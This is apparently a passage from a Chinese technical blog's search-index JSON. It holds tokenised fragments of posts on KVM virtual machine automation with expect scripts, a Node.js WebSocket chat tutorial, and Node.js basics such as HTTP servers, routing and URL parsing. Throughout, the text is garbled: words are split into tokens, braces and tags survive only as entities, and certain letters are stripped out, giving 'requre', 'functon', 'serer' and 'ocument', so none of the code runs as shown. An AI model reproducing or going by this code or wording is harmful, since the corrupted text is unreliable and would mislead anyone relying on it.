样","不够","灵活","，","改用","百分比","，","默认","50%","在","设置","百分比","的","时候","有","几点","小","问题","1","、","浮点","数","运算","保留","小数","使用","scale","可以","准确","保留","小数","，","echo","\"","scale","=","2",";","623","\"","bc","结果","20.66","使用","prntf","可以","保留","小数位","，","补","零","填充","prntf","%",".","2","f","结果","20.002","、","浮点","数","运算","不","保留","小数","echo","\"","123.123","\"","se","\"","s","\\",".",".","*","g","\"","*","代表","0","到","多","个","，","所以","第","一个","命令","中","\\",".","*","只能","替换","掉","小数点","变成","空","\\",".",".","*","代表","了","小数点","之后","的","1","到","多","个","3","、","除法","echo","\"","2","3","\"","bc","这个","结果","会","显示","为","0","echo","\"","scale","=","2",";","2","3","\"","bc","这个","结果","会","显示","为",".","66","prntf","\"","%",".","2","f","\"","`","echo","\"","scale","=","2",";","23","\"","bc","`","这个","结果","会","显示","为","0.66","[","1","]","刚开始","的","时候","选择","将","subm","_","confguraton",".","sh","这个","脚本","cat","进","内存","，","然后","用","expect","登录","到","子","机","的","时候","echo","到","文件","，","然后","执行","。","后来","发现","expect","输出","的","时候","会","把","subm","_","confguraton",".","sh","脚本","里","的","内容","先","执行","一遍","，","而且","还","存","在","其他","一些","问题","，","比如","说","echo","到","文件","的","时候","残缺","不全","、","不","换","行","、","文件","为","空等","。","后来","采用","磁盘","共享","的","方式","，","在","宿主","机","上","创建","一块","磁盘","，","然后","挂载","到","tmpshare","这个","目录","，","再","将","subm","_","confguraton",".","sh","脚本","和","pnfo","配置","文件","复制","到","该","目录","，","之后","在","子","机","的","XML","文件","中","添加","一块","sk","(","c",")","，","登录","进","子","机","后","，","挂载","c","，","此时","就","可以","看到","母机","上","tmpshare","下","的","内容","了","。","直接","执行","脚本","即可","。","磁盘","共享","也","有","一个","缺点","，","就是","文件","内容","不能","实时","刷新","，","比如","在","母机","上","改","了","pnfo","，","只","有","子","机","重","启","后","，","子","机","上","的","pnfo","才","可以","刷新","，","鉴于","tmpshare","这个","目录","每","个子","机","一生","只有","一次","用到","，","所以","这个问题","暂时","不需要","解决","。","[","2","]","创建","子","机","1","、","f","(","lan","!","=","0","&","amp",";","&","amp",";","xenbrx","not","n","`","brctl","show","`",")","会报","错","网卡","未","找到","导致","虚拟机","启动","失败","2","、","m","-","template","模板","不正确","，","包括","emulatorusrlocalbnqemu","-","system","-","x","86","_","64","emulator","路径","不正确","，","会","导致","虚拟机","无法","启动","3","、","sk","的","slot","卡槽","相同","会","导致","虚拟机","无法","启动","4","、","需要","注意的","是","，","rsh","efne","m","-","template","这","条","命令","的","执行","路径","是","usrlocaletclbrtqemum","-","template","，","最后","会","在","usrlocaletclbrtqemu","下生","成","m","$","pfmt",".","xml","的","配置","文件","。","[","3","]","expect","会","有","很多","问题","1","、","命令","不","按","顺序","执行","2","、","传入","的","变量","为","空","，","且","传入","的","变量","下标","是","从","0","开始","的","；","shell","传入","变量","下标","从","1","开始","，","0","代表","自身","文件","3","、","set","tmeout","$","tme","设置","的","时间","不一定","准确","，","设置","了","300秒","延时","，","但","未到","300","s","，","程序","还是","退出","了","，","可以","考虑","直接","设置","tmeout","为","-","14","、","expect","有","多种","写法","，","有","expect","EOF",";","expect","eof",";","最","正常的","是","上面","用","的","5","、","expect","文件","用","的","解释","器","是","usrbnexpect","，","这里","将","logn",".","sh","使用","cat","写在","了","单独","的","文件","中","[","4","]","1","、","subm","_","confguraton",".","sh","配置","了","两张","网卡","，","格式化","b","数据","盘","，","配置","ssh","2","、","eth","0","为","连接","外网","的","网卡","，","使用","tunnel","，","eth","1","为","内","网","网卡","，","使用","lanxenbrX","为","隧道","入口","，","母机","收到","从","xenbr","361口","收到","的","报文","，","就","发给","另一","端","隧道","，","从而","实现","连接","外网","tunnel","network","-","-","-","-","host","(","efault","router",":","subhost","-","netowrk",",","throught","nterface","&","amp",";","sh","lan",".","sh",")","-","-","-","-","subhost","母机","收到","lan","的","报文","，","就","在","指定","lan","的","广播","域内","进行","路由","（","不一","定","是","母机","进行","路由","）","lan","network","-","-","-","-","host","(","broacast","router",":","subhost","-","-","-","broacastlan","throught","802.1","Q",")","-","-","-","-","subhost","[","*","]","expect","合理","用法","cat","EOF","$","&","#","123",";","workr","&","#","125",";","logn",".","sh","#","!","usrbnexpectf","&","#","123",";","\\","$","argc","1","&","#","125",";","&","#","123",";","puts","\"","Usage",":","cm","host","\"","ext","1","&","#","125",";","set","tmeout","-","1","set","host","[","lnex","\\","$","arg","0","]","spawn","rsh","console","\\","$","hostexpect","\"","*","Escape","*","\"","&","#","123",";","sen","\"","\\","r","\"","&","#","125",";","expect","\"","*","logn","*","\"","&","#","123",";","sen","\"","root","\\","r","\"","&","#","125",";","expect","\"","*","Passwor","*","\"","&","#","123",";","sen","\"","xxxx","\\","r","\"","&","#","125",";","nteractEOF","高效","的","whle","whle","rea","equpmentName","p","netmask",";","o","echo","\"","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","$","&","#","123",";","equpmentName","&","#","125",";","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","=","\"","echo","\"","nner","_","p",":","$","&","#","123",";","p","&","#","125",";","\"","echo","\"","nner","_","netmask",":","$","&","#","123",";","netmask","&","#","125",";","\"","one","fle"],"url":"http://ymlog.cn/2020/06/04/KVM%E5%AE%9E%E4%BE%8B/","title":"KVM实例总结","content":"自动化脚本提升运维效率\n大纲kvm创建虚拟机的根本在于这样一条命令，virsh define vm-template.xml，这条命令的核心就是创建一个虚拟机，之后或者之前的内容都是围绕着这条命令和这个虚拟机的。\n- 更新vm-tem...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2020-06-04 17:19:51"},{"word":["WS","介绍","HTTP","超","文本","传输","协议","(","HTTP",",","HypertextTransferProtocol",")","是","互联网","上","应用","最为","广泛的","一种","网络","协议","。","是","用于","从","WWW","服务器","传输","超文本","到","本地","浏览器","的","传送","协议","。","Web","通讯","WebSocket","WebSocket","Protocal","是","HTML","5","一种","新的","协议","，","它","实现","了","浏览器","与","服务器","全","双工","通信","（","full","-","uple","）","，","一开始","握手","需要","借助","http","请求","完成","。","HTTP","请","求是","无","状态","的","，","每一次","收发","数据","都","需要","建立","连接","。","WebSocket","不需要","建立","连接","就","可以","收发","数据","。","WebSocket","对象","提供","一组","API","，","用于","创建","和","管理","WebSocket","连接","，","以及","通过","连接","发送","和","接受","数据","。","创建","WebSocket","对象","ar","ws","=","new","WebSocket","(","url",",","[","protocals","]",")",";","url",":","表示","要","连接","的","URL","，","这个","URL","应该","为","响应","WebSocket","的","地址","protocals",":","可以","是","单个","的","协议","名字","字符串","或者","包含","多","个","协议","名字","字符串","的","数组","方法","close","(","[","coe","]","[",",","reason","]",")","关闭","websocket","连接","或","停止","正在进行","的","连接","请求","coe",":","一个","数字","表示","关闭","连接","的","状态","号","，","表示","连接","关闭","的","原因","reason",":","一个","可读","字符串","，","表示","连接","被","关闭","的","原因","sen","(","ata",")","通过","websocket","连接","，","向","服务器","发送","数据","ata",":","一个","数字","值","表示","关闭","连接","的","状态","号","，","表示","连接","被","关闭","的","原因","属性","名词","解释","onclose","用于","监听","连接","关闭","事件","监听器","。","当","WebSocket","对象","的","ReayState","状态","变为","CLOSED","时","，","会","触发","该","事件","。","会","接受","一个","close","eent","对象","onerror","当","错误","发","生时","，","用于","监听","error","事件","的","事件","监听器","，","会","接受","一个","error","eent","对象","onmessage","一个","用于","消息","事件","的","事件","监听器","，","这","一","事件","当","有","消息","到达","的","时候","该","事件","会","触发","。","会","接受","一个","message","eent","对象","onopen","一个","用于","连接","打开","事件","的","事件","监听器","，","当","reayState","的","值","变为","OPEN","的","时候","会","触发","该","事件","，","会","接受","一个","open","eent","对象","reayState","连接","的","当前","状态","0","连接","还","没","开启","1","连接","已经","开启","并","准备","好","进行","通信","2","连接","正在","关闭","的","过程","中","3","连接","已经","关闭","，","或者","连接","无法","建立","简易的","WSnpm","安装","websocket","npm","nstall","websocket","后端","页面","ar","WebSocketSerer","=","requre","(","'","websocket","'",")",".","serer",";","ar","http","=","requre","(","'","http","'",")",";","创建","服务器","ar","serer","=","http",".","createSerer","(","functon","(","request",",","response",")","&","#","123",";","console",".","log","(","(","new","Date","(",")",")","+","'","Recee","request","for","'","+","request",".","url",")",";","response",".","wrteHea","(","404",")",";","response",".","en","(",")",";","&","#","125",";",")",";","监听","8080","端口","serer",".","lsten","(","3000",",","functon","(",")","&","#","123",";","console",".","log","(","(","new","Date","(",")",")","+","'","Serer","s","lstenng","on","port","8080","'",")",";","&","#","125",";",")",";","创建","websocket","服务器","wsSerer","=","new","WebSocketSerer","(","&","#","123",";","httpSerer",":","serer",",","autoAcceptConnectons",":","false","&","#","125",";",")",";","websocket","建立","连接","wsSerer",".","on","(","'","request","'",",","functon","(","request",")","&","#","123",";","当前","的","连接","ar","connecton","=","request",".","accept","(","null",",","request",".","orgn",")",";","console",".","log","(","(","new","Date","(",")",")","+","'","Connecton","accepte",".","'",")",";","定时","向","客户端","发送","消息","setInteral","(","functon","(",")","&","#","123",";","connecton",".","senUTF","(","\"","服务端","发送","新消息","\"","+","(","new","Date","(",")",")",")","&","#","125",";",",","1000",")","监听","当前","连接","，","发送","message","的","时候","connecton",".","on","(","'","message","'",",","functon","(","message",")","&","#","123",";","f","(","message",".","type","=","=","=","'","utf","8","'",")","&","#","123",";","console",".","log","(","'","Recee","Message",":","'","+","message",".","utf","8","Data",")",";","connecton",".","senUTF","(","message",".","utf","8","Data",")",";","&","#","125",";","else","f","(","message",".","type","=","=","=","'","bnary","'",")","&","#","123",";","console",".","log","(","'","Recee","Bnary","Message","of","'","+","message",".","bnaryData",".","length","+","'","bytes","'",")",";","connecton",".","senBytes","(","message",".","bnaryData",")",";","&","#","125",";","&","#","125",";",")",";","监听","当前","连接","，","当","close","的","时候","出发","事件","connecton",".","on","(","'","close","'",",","functon","(","reasonCoe",",","escrpton",")","&","#","123",";","console",".","log","(","(","new","Date","(",")",")","+","'","Peer","'","+","connecton",".","remoteAress","+","'","sconnecte",".","'",")",";","&","#","125",";",")",";","&","#","125",";",")",";","前端","页面","!","DOCTYPE","htmlhtml","lang","=","\"","en","\"","hea","meta","charset","=","\"","UTF","-","8","\"","meta","name","=","\"","ewport","\"","content","=","\"","wth","=","ece","-","wth",",","ntal","-","scale","=","1.0","\"","ttleWebsocket","前端","页面","ttleheaboy","scrpt","创建","websocket","对象","ar","ws","=","new","WebSocket","(","\"","ws",":","localhost",":","3000","\"",")",";","监听","建立","连接","ws",".","onopen","=","functon","(","res",")","&","#","123",";","console",".","log","(","\"","连接","成功","！","\"",")",";","console",".","log","(","res",")",";","&","#","125",";","监听","有","新消息","ws",".","onmessage","=","functon","(","res",")","&","#","123",";","console",".","log","(","\"","有","新","消息","！","\"",")",";","console",".","log","(","res",")",";","&","#","125",";","scrptboyhtml","页面","效果","多人","通讯","后端","ar","http","=","requre","(","\"","http","\"",")","引入","websocket","模块","ar","WebSocketSerer","=","requre","(","'","websocket","'",")",".","serer","存储","所有","终端","连接","ar","clents","=","[","]",";","引入","http","模块","，","搭建","http","服务器","ar","serer","=","http",".","createSerer","(",")","serer",".","lsten","(","3000",",","(",")","=","&","#","123",";","console",".","log","(","\"","服务器","搭建","成功","！",",","监听","localhost",":","3000","\"",")","&","#","125",";",")","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",",","functon","(",")","&","#","123",";","console",".","log","(","\"","服务器","创建","成功","\"",")","&","#","125",";",")","创建","websocket","服务","对象","ar","wsSerer","=","new","WebSocketSerer","(","&","#","123",";","httpSerer",":","serer","&","#","125",";",")",";","监听","连接","请求","，","建立","连接","webSocketRequest","当前","连接","建立","的","请求","wsSerer",".","on","(","'","request","'",",","functon","(","webSocketRequest",")","&","#","123",";","console",".","log","(","\"","建立","连接","\"",")","当前","连接","会话","ar","connecton","=","webSocketRequest",".","accept","(","null",",","'","accepte","-","orgn","'",")","把","连接","添加","到","终端","clents",".","push","(","connecton",")","当","客户端","发来","信息","的","时候",",","判断","信息","的","两种","类型","For","Text","Frames",":","&","#","123",";","type",":","\"","utf","8","\"",",","utf","8","Data",":","\"","A","strng","contanng","the","recee","message",".","\"","&","#","125",";","For","Bnary","Frames",":","&","#","123",";","type",":","\"","bnary","\"",",","bnaryData",":","bnaryDataBuffer","a","Buffer","object","contanng","the","bnary","message","payloa","&","#","125",";","connecton",".","on","(","\"","message","\"",",","functon","(","msg",")","&","#","123",";","如果","是","文本","类型","，","则","给","每一个","当前","的","连接","都","发送","一遍","f","(","msg",".","type","=","=","\"","utf","8","\"",")","&","#","123",";","console",".","log","(","\"","遍历","用户","，","发送","数据",".",".",".",".","\"","+","msg",".","utf","8","Data",")","遍历","连接","数组","，","给","每一个","连接","发送","数据","clents",".","forEach","(","functon","(","tem",")","&","#","123",";","发送","数据","tem",".","senUTF","(","msg",".","utf","8","Data",")","&","#","125",";",")","&","#","125",";","else","&","#","123",";","console",".","log","(","msg",")","&","#","125",";","&","#","125",";",")","当","连接","断开","的","时候",",","触发","事件","connecton",".","on","(","\"","close","\"",",","functon","(","reasonCoe",",","escrpton",")","&","#","123",";","console",".","log","(","\"","断开","连接","\"",")","获取","当前","索引","，","根据","索引","删除","连接","ar","nex","=","clents",".","nexOf","(","connecton",")","删除","clents",".","splce","(","nex",",","1",")","&","#","125",";",")","&","#","125",";",")","前端","!","DOCTYPE","htmlhtml","lang","=","\"","en","\"","hea","meta","charset","=","\"","UTF","-","8","\"","meta","name","=","\"","ewport","\"","content","=","\"","wth","=","ece","-","wth",",","ntal","-","scale","=","1.0","\"","ttle","多","终端","通信","ttleheaboy","ul","=","\"","content","\"","ul","nput","type","=","\"","text","\"","=","\"","msg","\"","button","onclck","=","\"","sen","(",")","\"","SENDbutton","scrpt","ar","ws","=","new","WebSocket","(","\"","ws",":","localhost",":","3000","\"",")",";","ar","nputNoe","=","ocument",".","getElementByI","(","\"","msg","\"",")","ar","ulCon","=","ocument",".","getElementByI","(","\"","content","\"",")","functon","sen","(",")","&","#","123",";","将","用户","输入","发送","给","服务端","ws",".","sen","(","nputNoe",".","alue",")","&","#","125",";","ws",".","onopen","=","functon","(","res",")","&","#","123",";","console",".","log","(","\"","连接","成功","！","\"",")",";","&","#","125",";","ws",".","onmessage","=","functon","(","msg",")","&","#","123",";","接受","服务端","传来","的","数据","这里","不是","msg",".","alue","，","因","为","这里","的","msg","是","websocket","的","msg","，","不是","=","msg","的","意思","console",".","log","(","\"","MSG",".","alue",":","\"","+","msg",".","ata",")","content",".","nnerHTML","+","=","'","l","'","+","msg",".","ata","+","'","l","'","&","#","125",";","scrptboyhtml"],"url":"http://ymlog.cn/2020/05/03/WebSocket/","title":"WebSocket","content":"WS介绍HTTP\n超文本传输协议(HTTP,HypertextTransferProtocol)是互联网上应用最为广泛的一种网络协议。是用于从WWW服务器传输超文本到本地浏览器的传送协议。\nWeb通讯\n\nWebSocket\nWebSo...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E7%BC%96%E7%A8%8B/","name":"编程"},"date":"2020-05-03 19:28:35"},{"word":["Noejs","简介","​","V","8","引擎","本身","是","用于","Chrome","浏览器","的","JS","解释","部分","，","但是","Ryan","Dahl","将","其","搬","到了","服务器","上","，","用于","做","服务器","。","​","浏览器","和","服务器","类似","，","浏览器","是","发送","HTTP","请求","，","接受","HTTP","响应","，","服务器","也是","接受","HTTP","请求","，","发送","HTTP","响应","。","都","已","HTML","的","方式","实现","。","​","Noejs","是","一个","让","Jaascrpt","运行","在","服务器端","的","开发","平台","，","它","让","Jaascrpt","的","触角","伸","到了","服务器端","，","可以","和","PHP","、","JSP","、","Python","、","Ruby","平起平坐","。","不同之处","：","Noejs","不是","一种","独立的","语言","，","与","PHP","、","JSP","、","Python","的","“","既是","语言","，","也是","平台","不同","，","Noejs","的","使用","Jaascrpt","进行","编程","，","运行","在","Jaascrpt","引擎","上","（","V","8","）","与","PHP","、","JSP","相比","，","Noejs","跳过","了","Apache","、","Ngnx","、","IIS","等","HTTP","服务器","，","自己","不用","建设","在任","何","服务器","软件","之上","。","Noejs","特点","单","线程","非","阻塞","IO","事件","驱动","1","、","单","线程","在","jaa","、","php","等","服务器端","语","言中","，","会","为","每个","客户","连接","创建","一个","新的","线程","，","每个","线程","耗费","大约","2","MB","的","内存","，","理论上","，","一个","8","G","内存","的","服务器","可以","同时","连接","的","最大","用户数","为","4000个","。","Noejs","不","为","每个","客户","连接","创建","一个","新的","线程","，","而","仅仅","使用","一个","线程","。","当","有","用户","连接","了","，","就","触发","一个","内部","时间","，","通过","非","阻塞","IO","、","事件","驱动","机制","，","让","Noe",".","js","程序","宏观","上","也是","并行","的","。","使用","Noejs","，","一个","8","G","的","服务器","可以","同时","处理","超过","4万","用户","的","连接","另外","，","单","线程","带来","的","好处","，","还有","操作系统","完全","不","再有","创建","线程","，","销毁","线程","带来","的","时间","开销","。","但是","，","一个","用户","造成","的","线程","崩溃","，","其他","服务","也","就","崩溃","了","。","2","、","非","阻塞","IO","（","non","-","blockng","IO","）","例如","，","当","在","访问","数据库","取得","数据","的","时候","，","需要","一段时间","。","在","传统","的","单线","程处理","机制","中","，","在","执行","了","访问","数据库","代码","之后","，","整个","线程","都","将","暂停","下来","，","等待","数据库","返回","结果","，","才能","执行","后面","的","代码","。","也就是说","，","IO","阻塞","了","代码","的","执行","，","极大","的","降低","了","程序","的","执行","效率","。","由于","Noejs","采用","了","非","阻塞","IO","机制","，","因此","在","执行","访问","数据库","代码","之后","，","将","立即","转而","执行","后面","的","代码","，","把","数据库","返回","结果","的","处理","代","码放","在","回调","函数","中","，","从而","提高","了","程序","执行","效率","。","当","某个","IO","执行","完毕","时","，","将","以","事件","的","形式","同","之","IO","操作","的","线程","，","线程","执行","这个","事件","的","回调","函数","，","为了","处理","异步","IO","，","线程","必须","有事","件","循环","，","不断","的","检查","有没有","未处理","的","事件","。","阻塞","模式","下","，","一个","线程","只能","处理","一项","任务","，","想要","提高","吞吐量","必须","通过","多线程","，","而","非","阻塞","模式","下","，","一个","线程","永远","在","执行","计算","操作","，","这个","线程","的","CPU","核心","利用率","永远","是","100%","。","3","、","事件","驱动","（","eent","-","ren","）","在","Noe","中","，","客户端","请求","建立","连接","，","提交","数据","等","行为","，","会","触发","相应","的","事件","，","在","Noe","中","，","一个","时刻","只能","执行","一个","事件","回调","函数","，","但是","在","执行","一个","事件","回调","函数","的","中途","，","可以","转而","处理","其他","事件","（","比如","又","有","新","用户","连接","）","，","然后","返回","据徐","执行","原","事件","的","回调","函数","，","这种","处理","机制","，","称为","”","时间","环","“","Noejs","底层","时","C++","，","底层","代码","中","，","近","半数","都是","用于","事件","队列","、","回调","函数","队列","的","构建","。","Noejs","适合","做","什么","？","​","善于","IO","，","不","善于","计算","。","因为","Noejs","最","擅长","的","就是","任务","调度","，","如果","你","的","业务","有","很多","CPU","计算","，","实际上","也","相当于","计算","阻塞","了","这个","单","线程","。","​","当","应用程序","需要","处理","大量","并发","IO","，","而","向","客户端","发出","响应","之前","，","应用程序","内部","不需要","进行","复杂","处理","的","时候","，","Noejs","非常","合适","。","Noejs","也","非常","合适","与","web","socket","配合","，","开发","长","连接","（","长","连接","实际上","是","通过","大量","请求","模拟","长","连接","）","的","实时","交互","应用程序","。","比如","用户","表单","收集","考试","系统","聊天室","图文","直播","提供","JSON","的","API","Noejs","本身","就是","极客","追求","性能","极致","的","产物","，","缺少","了","服务器","的","健壮","考量","。","所以","Noe","不可能","应用","在","极高","可靠性","的","业务","中","。","Hello","Noerequre","表示","导","包","ar","http","=","requre","(","\"","http","\"",")",";","创建","服务器","，","参数","是","一个","回调","函数","，","表示","如果","有","什么","请求","进来","，","要","做","什么","ar","serer","=","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","req","表示","请求","，","request","；","res","表示","响应","，","response","设置","HTTP","头部","，","状态","码","200","，","文件类型","html","，","字符集","utf","8","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","-","8","\"","&","#","125",";",")",";","res",".","en","(","\"","Hello","NoeJS","\"",")",";","&","#","125",";",")","运行","服务器","，","监听","3000","端口","，","任何","地址","都","可以","访问","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","NoeJS","是","服务器","语句","，","写","的","js","语句","都","将","运行","在","服务器","上","，","返回","给","客户","的","，","都是","已经","处理","好的","纯","HTML","。","如果","想","修改","程序","，","必须","中断","当前","程序","，","然后","重新","启动","noe","，","不支持","热","部署","。","Noejs","路由","Noe",".","JS","没有","根目录","，","因为","它","没有","web","容器","的","概念","。","先","写","一个","静态","的","H","5","页面","：","!","DOCTYPE","htmlhtml","lang","=","\"","en","\"","hea","meta","charset","=","\"","UTF","-","8","\"","meta","name","=","\"","ewport","\"","content","=","\"","wth","=","ece","-","wth",",","ntal","-","scale","=","1.0","\"","style",".","app","&","#","123",";","backgroun","-","color",":","re",";","&","#","125",";","style","ttleNoejs","读取","文件","ttleheaboy","class","=","\"","app","\"","这是","一个","测试","文件","boyhtml","效果","大概","是","这样","：","使用","req",".","url","判断","输入","的","路径","使用","fs",".","reaFle","(",")","读取","网页","页面","使用","res",".","en","(",")","返回","数据","然后","写","statcRener",".","js","文件","ar","http","=","requre","(","\"","http","\"",")",";","ar","fs","=","requre","(","\"","fs","\"",")",";","ar","serer","=","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","f","(","req",".","url","=","=","\"","re","\"",")","&","#","123",";","输入","路由","和","源文件","没有","关系","fs",".","reaFle","(","\"",".","re",".","html","\"",",","functon","(","err",",","ata",")","&","#","123",";","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","-","8","\"","&","#","125",";",")",";","res",".","en","(","ata",")",";","&","#","125",";",")",";","&","#","125",";","else","f","(","req",".","url","=","=","\"","blue","\"",")","&","#","123",";","fs",".","reaFle","(","\"",".","blue",".","html","\"",",","functon","(","err",",","ata",")","&","#","123",";","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","-","8","\"","&","#","125",";",")",";","res",".","en","(","ata",")",";","&","#","125",";",")",";","&","#","125",";","else","&","#","123",";","res",".","wrteHea","(","404",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","-","8","\"","&","#","125",";",")",";","res",".","en","(","\"","没有","这个","页面","\"",")",";","&","#","125",";","&","#","125",";",")",";","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","NoeJS","任何","静态","页面","都","需要","路由","，","比如","在","HTML","中","插入","一个","mage","或者","css","样式","，","也","需要","设置","一条","路由","。","Noejs","擅长","做","顶层","路由","设计","。","模块","Noejs","中","，","讲","很多","的","功能","划分","为了","一个个","moule","。","HTTP","模块","引用","模块","ar","http","=","requre","(","\"","http","\"",")",";","ar","serer","=","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","req","参数","表示","请求","，","res","表示","响应","console",".","log","(","\"","服务器","接收","到了","请求","\"","+","req",".","url",")",";","告诉","浏览器","连接","终止","res",".","en","(",")",";","en","中","必须","是","字符串","或者","缓冲区","&","#","125",";",")",";","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","向","请求","发送","响应","头","，","此","方法","只能","在","消息","上","调用","一次","，","并且","必须","在","调用","response",".","en","(",")","之前","调用","。","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","-","8","\"","&","#","125",";",")",";","req","的","属性","，","最","关键","的","就是","req",".","url","属性","，","表示","用户","请求","的","URL","地址","，","所有","路由","设计","，","都是","通过","req",".","url","来","实现","的","，","我们","比较","关心","的","不是","拿到","URL","，","而是","识别","这个","URL","。","识别","URL","用到","两个","模块","，","一个","是","url","模块","，","另一个","是","querystrng","模块","。","url","用于","解析","url","，","这样","就","可以","不用","正则","表达式","了","http",":","noejs",".","cnapurl",".","html","#","url","_","url","_","strngs","_","an","_","url","_","objects","ar","url","=","requre","(","\"","url","\"",")",";","url",".","parse","(",")","可以","将","一个","完整的","URL","地址","分为","很多","部分","myURL","=","url",".","parse","(","'","https",":","user",":","pass@sub.host.com",":","8080","path","?","query","=","strng","#","hash","'",")",";","console",".","log","(","myURL",".","host",")",";","url",".","host","获取","及","设置","URL","的","主机","部分","。","url",".","hostname","获取","及","设置","URL","的","主机名","部分","。","url",".","host","和","url",".","hostname","之间","的","区别","是","url",".","hostname","不","包含","端口","。","url",".","passwor","获取","及","设置","URL","的","密码","部分","。","url",".","pathname","获取","及","设置","URL","的","路径","部分","。","url",".","port","获取","及","设置","URL","的","端口","部分","。","url",".","protocol","获取","及","设置","URL","的","协议","部分","。","url",".","username","获取","及","设置","URL","的","用户名","部分","。","url",".","query","获取","及","设置","URL","的","查询","部分","&","amp",";","name","=","jack","&","amp",";","age","=","18","url",".","parse","(","req",".","url",",","true",")",".","query","=","[","Object",":","null","prototype","]","&","#","123",";","name",":","'","jack","'",",","age",":","'","18","'","&","#","125",";","[","Object",":","null","prototype","]","&","#","123",";","name",":","'","jack","'",",","age",":","'","18","'","&","#","125",";","url",".","parse","(","'","url","'",",","true",")",";","如果","第二个","参数","是","true","，","那么","就","可以","把","所","有的","查询","变为","对象","，","就","可以","直接","打点","得到","这个","参数","。","表单","提交","案例","：","!","DOCTYPE","htmlhtml","lang","=","\"","en","\"","hea","meta","charset","=","\"","UTF","-","8","\"","meta","name","=","\"","ewport","\"","content","=","\"","wth","=","ece","-","wth",",","ntal","-","scale","=","1.0","\"","ttle","表单","提交","ttleheaboy","form","acton","=","\"","http",":","127.0.0.1",":","3000","\"","metho","=","\"","GET","\"","nput","type","=","\"","text","\"","name","=","\"","name","\"","br","nput","type","=","\"","text","\"","name","=","\"","age","\"","br","nput","type","=","\"","rao","\"","name","=","\"","sex","\"","alue","=","\"","男","\"","男","nput","type","=","\"","rao","\"","name","=","\"","sex","\"","alue","=","\"","女","\"","女","br","nput","type","=","\"","submt","\"","formboyhtml","提交","到","浏览器","的","结果","为","：","http",":","127.0.0.1",":","3000","?","name","=","杜振铨","&","amp",";","age","=","21","&","amp",";","sex","=","男","然后","在","Noejs","服务端","用","url","解析","出来","ar","http","=","requre","(","\"","http","\"",")",";","ar","url","=","requre","(","\"","url","\"",")",";","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","myURL","=","url",".","parse","(","req",".","url",",","true",")",";","ar","nfo","=","\"","服务器","收到","了","-","姓名","：","\"","+","myURL",".","query",".","name","+","\"","性别","：","\"","+","myURL",".","query",".","sex","+","\"","年龄","：","\"","+","myURL",".","query",".","age",";","这里","要用","UTF","8","不然","中文","乱码","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","8","\"","&","#","125",";",")",";","res",".","en","(","nfo",")",";","&","#","125",";",")",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","最后","在","网页","上","呈现","这样","的","效果","：","服务器","收到","了","-","姓名","：","杜振铨","性别","：","男","年龄","：","21","简单的","路由","演示","：","ar","http","=","requre","(","\"","http","\"",")",";","ar","serer","=","http",".","createSerer","(","functon","(","req",",","res",")","&","#","123",";","http",":","127.0.0.1",":","3000","teacher","122456","提取","出","url",",","为","teacher","123456","ar","myurl","=","req",".","url",";","console",".","log","(","myurl",")",";","res",".","wrteHea","(","200",",","&","#","123",";","\"","Content","-","type","\"",":","\"","texthtml",";","charset","=","UTF","8","\"","&","#","125",";",")",";","比较","前","9位","[","0",",","9",")","f","(","myurl",".","substr","(","0",",","9",")","=","=","\"","teacher","\"",")","&","#","123",";","取出","从","第九位","开始","往后","的",",","这里","就是","123456","tearcher","=","myurl",".","substr","(","9",")",";","看","取","出来","的","是否","满足","6位","数字",",","不满足","则","返回","不存在",",","学生","栏","也","一样","f","(","^","\\","&","#","123",";","6","&","#","125",";","$",".","test","(","tearcher",")",")","&","#","123",";","res",".","en","(","\"","您要","查询","的","老师","信息","为",":","\"","+","tearcher",")",";","&","#","125",";","else","&","#","123",";","res",".","en","(","\"","您","访问","的","老师","不存在","!","\"",")",";","&","#","125",";","&","#","125",";","else","f","(","myurl",".","substr","(","0",",","9",")","=","=","\"","stuent","\"",")","&","#","123",";","ar","stuent","=","myurl",".","substr","(","9",")",";","f","(","^","\\","&","#","123",";","10","&","#","125",";","$",".","test","(","stuent",")",")","&","#","123",";","res",".","en","(","\"","您要","查询","的","学生","信息","为",":","\"","+","stuent",")",";","&","#","125",";","else","&","#","123",";","res",".","en","(","\"","您","访问","的","学生","不存在","!","\"",")",";","&","#","125",";","&","#","125",";","else","&","#","123",";","res",".","en","(","\"","您","访问","的","人员","不存在","!","\"",")",";","&","#","125",";","&","#","125",";",")",";","serer",".","lsten","(","3000",",","\"","0.0.0.0","\"",")",";","fs","reaFle","读取","文件","mkr","新建","文件夹","rmr","移","除","文件夹","fs",".","Stats","查看","文件属性","stats",".","sBlockDece","(",")","stats",".","sCharacterDece","(",")","stats",".","sDrectory","(",")","stats",".","sFIFO","(",")","stats",".","sFle","(",")","stats",".","sSocket","(",")","…",".","读取","文件","三个","参数",",","第","一个","是","完整的","路径",",","当前","目录","写",".","第二个","参数","是","字符集",",","也","可以","不","设置","第三个","参数","是","回调","函数",",","表示","文件","读取","成功","后",",","做","的","事","fs",".","reaFle","(","\"",".","emo",".","txt","\"",",","&","#","123",";","\"","charset","\"",":","\"","utf","-","8","\"","&","#","125",";",",","functon","(","err",",","ata",")","&","#","123",";","抛","异常","f","(","err",")","&","#","123",";","throw","err",";","&","#","125",";","console",".","log","(","user","+","\"","文件","读取","完毕","!","\"",